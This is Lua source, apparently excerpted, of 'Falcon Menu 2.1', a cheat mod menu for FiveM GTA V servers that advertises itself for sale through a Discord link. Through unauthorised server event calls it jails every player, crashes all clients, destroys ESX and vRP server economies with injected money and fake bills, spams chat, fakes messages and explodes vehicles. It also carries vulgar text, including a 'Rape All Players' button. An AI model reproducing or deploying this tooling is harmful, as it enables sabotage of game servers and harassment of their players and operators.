...
local vehlistv = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "falcon", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
...
function falcon.CheckBox(text, bool, callback)
	local checked = "~r~~h~Off"
	if bool then
		checked = "~g~~h~On"
	end

	if falcon.Button(text, checked) then
		bool = not bool
...
function RapeAllFunc()
    for bs=0,9 do
        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV")
    end
end
    ...
    Citizen.CreateThread(function()
        ...
        for i=0,128 do
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, " Welcome *Falcon MODZ 2.1* buy Mod Menu in https://discord.gg/qQWKBEV")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, " Welcome *Falcon MODZ 2.1* buy Mod Menu in https://discord.gg/qQWKBEV")
				TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, " Welcome *Falcon MODZ 2.1* buy Mod Menu in https://discord.gg/qQWKBEV")
					end
				end
			...
			if esxdestroy then
				for i = 0, 128 do
						...
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(i), "item_money", "money", 10000000)	
						TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Best Falcon Menu 2.1 https://discord.gg/qQWKBEV", 10000000)
			...
			function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        ...
                        '^' .. bD .. '^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
...
drawNotification("~h~-» ~g~revive success!")
	...
	if sall then
			...
			if spam then
                ...
                TriggerServerEvent('_chat:messageEntered', '^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV', {0, 0x99, 255}, '^2The server just got fucked by ^1F^3a^4l^5c^6o^7n ^1M^2e^3n^4u: https://discord.gg/qQWKBEV')
                end
			end
...
Citizen.CreateThread(
	function()
		...
		falcon.CreateMenu("MainMenu", "∑ Falcon ~n~~r~MENU ∑")
		falcon.SetSubTitle("MainMenu", "VERSION 2.1")
		falcon.CreateSubMenu("Models", "MainMenu", "Model")
		falcon.CreateSubMenu("SelfMenu", "MainMenu", "PlayerMenu")
		falcon.CreateSubMenu("World", "MainMenu", "World")
		falcon.CreateSubMenu("Fuck", "MainMenu", "Fuck")
		falcon.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		falcon.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		falcon.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		falcon.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		falcon.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		falcon.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		falcon.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		falcon.CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		falcon.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		falcon.CreateSubMenu("ESXMoney", "ServerMenu", "Money Options")
		falcon.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		falcon.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		falcon.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		falcon.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		falcon.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		falcon.CreateSubMenu("PlayerTrollMenu", "OnlinePlayerMenu", "Troll Options")
		falcon.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
		falcon.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
		falcon.CreateSubMenu("WeaponCustomization", "WepMenu", "Weapon Cusomization Options")
		falcon.CreateSubMenu('TorqueBoostMenu', 'VehMenu', 'Torque Boost ~b~>~s~')
	    falcon.CreateSubMenu(
            'WeaponTypes',
            'WepMenu',
            'Weapons'
        )
        ...
        falcon.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        falcon.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
		falcon.CreateSubMenu('VehBoostMenu', 'VehMenu', 'Vehicle Boost')
		
        falcon.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Types')
        falcon.CreateSubMenu(
            'CarOptions',
            'CarTypeSelection',
            'Car Options'
        )
		falcon.CreateSubMenu('LSC', 'VehMenu', 'LSC Customs')
        falcon.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        falcon.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
		
		
		for i, da in pairs(be) do
            falcon.CreateSubMenu(da.id, 'tunings', da.name)
            if da.id == 'paint' then
                falcon.CreateSubMenu('primary', da.id, 'Primary Paint')
                falcon.CreateSubMenu('secondary', da.id, 'Secondary Paint')
                falcon.CreateSubMenu('rimpaint', da.id, 'Wheel Paint')
                falcon.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                falcon.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                falcon.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                falcon.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                falcon.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                falcon.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                falcon.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                falcon.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                falcon.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                falcon.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                falcon.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                falcon.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
		for i, da in pairs(bf) do
            falcon.CreateSubMenu(da.id, 'performance', da.name)
        end
        local SelectedPlayer
        while bm do
            ped = PlayerPedId()
            ...
            for i, da in pairs(be) do
                if falcon.IsMenuOpened('tunings') then
                    if b9 then
                        if bb == 'neon' then
                ...
                if falcon.IsMenuOpened(da.id) then
                    if da.id == 'wheeltypes' then
                        if falcon.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif falcon.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif falcon.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif falcon.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif falcon.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif falcon.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif falcon.Button('High End Wheels') then
                    ...
                    elseif da.id == 'neon' then
                        ...
                        for i, da in pairs(bg) do
                            ...
                            if falcon.Button(i, pricestring) then
                                if not b9 then
                                    bb = 'neon'
                    ...
                    elseif da.id == 'paint' then
                        if falcon.MenuButton('~h~~p~-> ~s~Primary Paint', 'primary') then
                        elseif falcon.MenuButton('~h~~p~-> ~s~Secondary Paint', 'secondary') then
                        elseif falcon.MenuButton('~h~~p~-> ~s~Wheel Paint', 'rimpaint') then
                        end
                        falcon.Display()
                    else
                        ...
                        for dg, dh in pairs(at) do
                            ...
                            if falcon.Button(dh.menuName, price) then
                                if not b9 then
                                    bb = da.id
            ...
            for i, da in pairs(bf) do
                if falcon.IsMenuOpened(da.id) then
                    ...
                    if falcon.Button('Stock ' .. da.name, pricestock) then
                        SetVehicleMod(veh, da.id, -1)
                    elseif falcon.Button(da.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, da.id, 0)
                    elseif falcon.Button(da.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, da.id, 1)
                    elseif falcon.Button(da.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, da.id, 2)
                    elseif da.id ~= 13 and da.id ~= 12 and falcon.Button(da.name .. ' Upgrade 4', price4) then
			...
			if falcon.IsMenuOpened("MainMenu") then
			    
			    drawNotification(" Falcon Menu 2.1  ~n~~h~WELCOME ~r~[~s~ " ..GetPlayerName(PlayerId()).." ~r~]")
				...
				drawNotification("~h~~g~Official Discord: ~s~~n~~h~https://discord.gg/qQWKBEV ~n~~r~oFlaqme#1149")
				
				if falcon.MenuButton("→  ~h~~c~ONLINE ~s~PLAYERS", "OnlinePlayerMenu") then
				elseif falcon.MenuButton("→  ~h~~b~PLAYERS ~s~MENU", "SelfMenu") then
				elseif falcon.MenuButton("→  ~h~~o~MODELS ~s~MENU", "Models") then
				elseif falcon.MenuButton("→  ~h~~y~WORLD ~s~MENU", "World") then
				elseif falcon.MenuButton("→  ~h~~g~TELEPORTE  ~s~MENU", "TeleportMenu") then
				elseif falcon.MenuButton("→  ~h~~m~VEHICLES  ~s~MENU", "VehMenu") then
				elseif falcon.MenuButton("→  ~h~~p~WEAPONS  ~s~MENU", "WepMenu") then
				elseif falcon.MenuButton("→  ~h~~r~FUCK  ~s~MENU", "Fuck") then
				elseif falcon.MenuButton("→  ~h~<FONT COLOR='#15f600'>∑ LUA ~s~MENU ∑", "ServerMenu") then
				elseif falcon.Button("X ~r~DISCONNECT ~s~X") then
					bm = false
				end

				falcon.Display()
			elseif falcon.IsMenuOpened("SelfMenu") then
				if
				falcon.CheckBox(
				...
				then 
				elseif falcon.ComboBox("Radius ~b~Distance", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
				...
				elseif falcon.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif falcon.Button("~h~~g~Revive") then
				SetEntityHealth(PlayerPedId(), 200)
				SetPedArmour(PlayerPedId(), 200)
				TriggerEvent("esx_status:set", "thirst", 1000000)
				TriggerEvent("esx_status:set", "hunger", 1000000)
					TriggerEvent("esx_ambulancejob:revive")
				    TriggerEvent('ambulancier:selfRespawn')
				elseif falcon.Button("~h~~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif falcon.Button("~o~~h~Set hunger to ~s~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif falcon.Button("~b~~h~Set thirst to ~s~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif falcon.Button("~h~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif falcon.Button("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
					elseif falcon.Button("~b~Cuff ~s~Player") then
				...
				elseif
				falcon.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				falcon.CheckBox(
					"~h~Super Jump",
				...
				then
				elseif
				falcon.CheckBox("~h~Fast Run",fastrun,function(enabled)fastrun = enabled end)
			 	then
				elseif
				falcon.CheckBox(
					"~h~Invisible",
				...
				then
				elseif
				falcon.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		falcon.Display()
			elseif falcon.IsMenuOpened("TeleportMenu") then
				if falcon.Button("~h~Teleport ~h~~p~Waypoint ~r~(KEY 1)") then
				TeleportToWaypoint()
			 elseif falcon.Button("~h~Teleport ~h~~p~intro Vehicle ") then
			...
			elseif falcon.Button("~h~Teleport ~s~~p~To Coords") then
                TeleportToCoords()
			elseif falcon.Button("~h~Teleport ~h~~g~LSPD ") then
			    LSPD()
			elseif falcon.Button('~h~Teleport ~h~~g~FBI') then
				fbi()
			elseif falcon.Button('~h~Teleport ~h~~g~LS Customs') then
				ls()
			elseif falcon.Button('~h~Teleport ~h~~g~Main Garage') then
				gp()
		    elseif falcon.Button('~h~Teleport ~h~~g~Ammunation') then
			    Ammunation()
			elseif falcon.Button('~h~Teleport ~h~~g~Clothes shop') then
			    shopclothes()
			elseif falcon.Button('~h~Teleport ~h~~g~Barber') then
			    barber()
			elseif falcon.Button('~h~Teleport ~h~~g~Maze Bank') then
			    MazeBank()
			elseif falcon.Button('~h~Teleport ~h~~g~Spot') then
			    spot()
			elseif falcon.Button('~h~Teleport ~h~~g~Michael House') then
			    MichaelHouse()
			elseif falcon.Button('~h~Teleport ~h~~g~Trevor Trailer') then
			    trevor()
		...
		elseif
			...
			elseif falcon.CheckBox(
				...
				elseif falcon.CheckBox(
					...
					then
				elseif falcon.Button("Time set to night") then
				NetworkOverrideClockTime(23, 50, 0)
				elseif falcon.Button("Time set to day") then
				NetworkOverrideClockTime(12, 12, 0)
			end

		falcon.Display()
		elseif falcon.IsMenuOpened("Fuck") then
		if falcon.Button("~h~~r~Give All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
				...
				elseif falcon.Button("~h~~r~Remove All Weapons ~s~~h~Players") then
					for ids = 0, 128 do
						if ids ~= PlayerId() and GetPlayerServerId(ids) ~= 0 then
							for i = 1, #allWeapons do
		...
		elseif falcon.Button("~h~~y~(Attention) ~r~Fuck Server everything") then
                    nukeserver()
	elseif
		falcon.CheckBox(
	...
	then
		elseif falcon.Button("~h~~r~Set ~s~~h~All Nearby Vehicles Plate Text") then
            local plateInput = KeyboardInput("Enter Plate Text (8 Characters):" , "", 100000000)
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleNumberPlateText(k, plateInput)
            end
      elseif falcon.Button("~h~~r~Close ~s~the whole square") then
 ...
 elseif falcon.Button("~h~~r~Rape ~s~All Players") then
                    RapeAllFunc()
	 elseif falcon.Button("~h~~r~Fake ~h~~s~chat Message") then 
	 local eX = KeyboardInput("Enter player name", "", 100) if eX then local dT = KeyboardInput("Enter message", "", 10000) if dT then TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", eX, {0, 0x99, 255}, dT) end end
      elseif falcon.Button("~h~~r~Crash ~s~All Players") then
                    for i = 0, 128 do
	...
	then
	elseif falcon.Button("~h~~r~Spawn ~p~Lion ~w~all Players") then
	...
	elseif falcon.Button("~h~~r~Spawn ~p~SWAT ~w~all Players ") then
	 ...
	 elseif falcon.Button('~h~~r~Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
	...
	then
	elseif falcon.Button("~h~~r~ESX ~s~Fuck Server economy ~s~v~y~2") then
				    esxdestroyv2()
	elseif falcon.Button("~h~~r~VRP ~s~Fuck Server economy") then
				    vrpdestroy()
	elseif
		falcon.CheckBox(
	...
	then
	elseif falcon.Button("~h~~b~------Fuck all Vehicles------") then
	elseif falcon.Button("~h~~r~Rampinator") then
    ...
    elseif falcon.CheckBox("~h~~r~Delete~s~ Vehicles", deletenearestvehicle, function(eC) deletenearestvehicle = eC end) then 
	elseif falcon.Button("~h~~r~BORGAR~s~ Vehicles") then local cC = GetHashKey("xs_prop_hamburgher_wl") for vehicle in EnumerateVehicles() do local cD = CreateObject(cC, 0, 0, 0, true, true, true) AttachEntityToEntity(cD, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, true, true, false, true, 1, true) end 
	elseif falcon.CheckBox("~h~~r~Explode~s~ Vehicles", explodevehicles, function(eC) explodevehicles = eC end) then
	elseif falcon.CheckBox("~h~~r~Fuck~s~ Vehicles", fuckallcars, function(eC) fuckallcars = eC end) then end;
	
				falcon.Display()
			elseif falcon.IsMenuOpened("WepMenu") then
			if falcon.MenuButton('~h~~r~→  ~y~Ammunition', 'WeaponTypes') then
			    elseif falcon.MenuButton("~r~→  ~s~Weapon Customization", "WeaponCustomization") then
				elseif falcon.MenuButton("~r~→  ~s~Weapon", "SingleWepMenu") then
				elseif falcon.Button("~h~~g~Give ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
					end
				elseif falcon.Button("~h~~r~Remove ~s~~h~All Weapons") then
					for i = 1, #allWeapons do
						RemoveAllPedWeapons(PlayerPedId(), true)
					end
				elseif falcon.Button("~h~~b~Give Ammo") then
					for i = 1, #allWeapons do
			...
			elseif
				...
				elseif
				 ...
				 then
				 elseif
					 falcon.CheckBox("~h~Vehicle Gun",VehicleGun,
				 	 function(enabled)VehicleGun = enabled end) 
			 	then
			 	elseif
					 falcon.CheckBox("~h~Delete Gun",DeleteGun,
				 	 function(enabled)DeleteGun = enabled end) 
			 	then
				end
				
				falcon.Display()
            elseif falcon.IsMenuOpened('WeaponTypes') then
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('WeaponTypeSelection') then
                for dp, dD in pairs(d4) do
                    if falcon.MenuButton(dD.name, 'WeaponOptions') then
                        d5 = dD
                    end
                end
                falcon.Display()
            elseif falcon.IsMenuOpened('WeaponOptions') then
                if falcon.Button('~h~~y~Spawn Weapon inventory') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(d5.id), 1000, false)
                end
                if falcon.Button('~h~+ ~g~Ammo') then
                ...
                for dp, dD in pairs(d5.mods) do
                    if falcon.MenuButton('~h~~r~> ~s~' .. dp, 'ModSelect') then
                        d6 = dD
                    end
                end
				falcon.Display()
            elseif falcon.IsMenuOpened('ModSelect') then
                for _, dD in pairs(d6) do
                    if falcon.Button(dD.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(d5.id), GetHashKey(dD.id))
                    end
                end

				falcon.Display()
			elseif falcon.IsMenuOpened("SingleWepMenu") then
				for i = 1, #allWeapons do
            ...
            elseif falcon.IsMenuOpened("WeaponCustomization") then
                ...
                then
                elseif falcon.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif falcon.Button("~g~Add Special Finish") then
                ...
                elseif falcon.Button("~r~Remove Special Finish") then
                ...
                elseif falcon.Button("~g~Add Suppressor") then
                ...
                elseif falcon.Button("~r~Remove Suppressor") then
                ...
                elseif falcon.Button("~g~Add Scope") then
                ...
                elseif falcon.Button("~r~Remove Scope") then
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("VehMenu") then
			if falcon.Button("~r~→  ~s~Vehicles ~y~Name") then
			...
			for i=1, #compacts do
				if falcon.Button(compacts[i]) then
					SpawnVeh(compacts[i], PlaceSelf)
				end
			end
			elseif falcon.MenuButton('~r~→  ~s~Vehicles ~r~List', 'CarTypes') then
			elseif falcon.MenuButton('~r~→  ~o~LSC ~s~Customs', 'LSC') then
			elseif falcon.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
			elseif falcon.MenuButton('~r~→  ~s~Torque Boost', 'TorqueBoostMenu') then
			elseif falcon.Button("~h~Buy ~b~vehicle ~s~~h~for ~g~free") then fv()
				elseif falcon.Button("~h~~g~Repair ~b~Vehicle~s~ (Key 2)") then
					SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					elseif falcon.Button("~h~~g~Repair ~y~Engine") then
    ...
    if not DoesEntityExist(veh) then
        drawNotification(
            "~r~You Aren't Sitting In A Vehicle Stupid"
				...
				elseif falcon.Button("~h~Max ~b~Exterior Tuning") then
					MaxOut(GetVehiclePedIsUsing(PlayerPedId())
)				elseif falcon.Button("~h~Max ~b~Performance") then
					engine(GetVehiclePedIsUsing(PlayerPedId()))
				elseif falcon.Button("~h~Max All ~b~Tuning") then
				...
				then
			    elseif falcon.Button("~h~~b~Change License Plate") then
					local playerPed = GetPlayerPed(-1)
			...
			elseif falcon.CheckBox(
				...
				falcon.Display()
            elseif falcon.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(be) do
                    if da.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if falcon.MenuButton(da.name, da.id) then
                        end
                    elseif da.id == 'neon' then
                        if falcon.MenuButton(da.name, da.id) then
                        end
                ...
                if falcon.Button('Xenon Headlight', xenonStatus) then
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, da in pairs(bf) do
                    if falcon.MenuButton(da.name, da.id) then
                    end
                ...
                if falcon.Button('~h~~b~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                falcon.Display()
            elseif falcon.IsMenuOpened('primary') then
                falcon.MenuButton('~h~~p~-> ~s~Classic', 'classic1')
                falcon.MenuButton('~h~~p~-> ~s~Metallic', 'metallic1')
                falcon.MenuButton('~h~~p~-> ~s~Matte', 'matte1')
                falcon.MenuButton('~h~~p~-> ~s~Metal', 'metal1')
                falcon.Display()
            elseif falcon.IsMenuOpened('secondary') then
                falcon.MenuButton('~h~~p~-> ~s~Classic', 'classic2')
                falcon.MenuButton('~h~~p~-> ~s~Metallic', 'metallic2')
                falcon.MenuButton('~h~~p~-> ~s~Matte', 'matte2')
                falcon.MenuButton('~h~~p~-> ~s~Metal', 'metal2')
                falcon.Display()
            elseif falcon.IsMenuOpened('rimpaint') then
                falcon.MenuButton('~h~~p~-> ~s~Classic', 'classic3')
                falcon.MenuButton('~h~~p~-> ~s~Metallic', 'metallic3')
                falcon.MenuButton('~h~~p~-> ~s~Matte', 'matte3')
                falcon.MenuButton('~h~~p~-> ~s~Metal', 'metal3')
                falcon.Display()
            elseif falcon.IsMenuOpened('classic1') then
                for dt, du in pairs(bh) do
                    ...
                    if falcon.Button(du.name, pricetext) then
                        if not b9 then
                            bb = 'paint'
                            bd = false
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('metallic1') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('matte1') then
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('metal1') then
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('classic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('metallic2') then
                for dt, du in pairs(bh) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('matte2') then
                for dt, du in pairs(bj) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('metal2') then
                for dt, du in pairs(bk) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('classic3') then
                for dt, du in pairs(bh) do
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('metallic3') then
                for dt, du in pairs(bh) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('matte3') then
                for dt, du in pairs(bj) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('metal3') then
                for dt, du in pairs(bk) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == du.id and not b9 then
                        pricetext = 'Installed'
            ...
            elseif falcon.IsMenuOpened('metal3') then
                ...
                falcon.Display()
            elseif falcon.IsMenuOpened('AICONTROLMENU') then
                if falcon.Button('~h~Configure AI ~g~Speed') then
                ...
                elseif falcon.Button('~h~AI Drive (Waypoint_Slow)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif falcon.Button('~h~AI Drive (Waypoint_Fast)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif falcon.Button('~h~Stop AI') then
				 ...
				 falcon.Display()
            elseif falcon.IsMenuOpened('LSC') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                falcon.MenuButton('~h~Exterior ~r~Tuning', 'tunings')
                falcon.MenuButton('~h~Performance ~r~Tuning', 'performance')
			
				falcon.Display()
            elseif falcon.IsMenuOpened('CarTypes') then
                for i, dF in ipairs(aY) do
                    if falcon.MenuButton('~h~~r~> ~s~' .. dF, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                falcon.Display()
            elseif falcon.IsMenuOpened('CarTypeSelection') then
                for i, dF in ipairs(aZ[carTypeIdx]) do
                    if falcon.MenuButton('~h~~r~# ~s~' .. dF, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                falcon.Display()
            elseif falcon.IsMenuOpened('CarOptions') then
			if falcon.Button('~h~~y~-Spawn intro vehicle-') then
                ...
                elseif falcon.Button('~h~~g~-Spawn vehicle-') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = aZ[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
		...
		falcon.Display()
				...
				elseif falcon.IsMenuOpened('TorqueBoostMenu') then 
			if falcon.CheckBox('Engine Torque boost ~h~~g~x2', Torque2, function(enabled)
				Torque2 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x4', Torque4, function(enabled)
				Torque4 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x8', Torque8, function(enabled)
				Torque8 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x16', Torque16, function(enabled)
				Torque16 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x32', Torque32, function(enabled)
				Torque32 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x64', Torque64, function(enabled)
				Torque64 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x128', Torque128, function(enabled)
				Torque128 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x256', Torque256, function(enabled)
				Torque256 = enabled
			end) then
			elseif falcon.CheckBox('Engine Torque boost ~h~~g~x512', Torque512, function(enabled)
				Torque512 = enabled
			end) then
			end
			...
			elseif falcon.IsMenuOpened("Models") then
								...
								if falcon.ComboBox("~h~~b~Male Model", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif falcon.Button("Selected ~b~> ") then
					Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model1)
				elseif falcon.ComboBox("~h~~p~Female Model", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif falcon.Button("Selected ~p~>") then
		Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model5)
				elseif falcon.ComboBox("~h~~o~Animal Model", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
	elseif falcon.Button("Selected ~o~> ") then
			Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model6)
		elseif falcon.Button("Spawn ~r~Deer ~s~And Ride") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif falcon.Button("~g~Reset Model To FiveM Player") then
						Deer.Destroy()
		Wait(100)
	...
	elseif falcon.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif falcon.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
	...
	elseif falcon.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
	...
	elseif falcon.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
	...
	elseif falcon.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
	...
	elseif falcon.Button("~h~Randomize ~r~Model") then
    ...
    TriggerEvent('esx_skin:openSaveableMenu')
				...
				falcon.Display()
			elseif falcon.IsMenuOpened("ServerMenu") then
				if falcon.MenuButton("~s~Menu ~h~~r~JOBS", "RecrutarPlayers") then
				elseif falcon.MenuButton("~s~Menu ~b~~h~BOSS", "ESXBoss") then
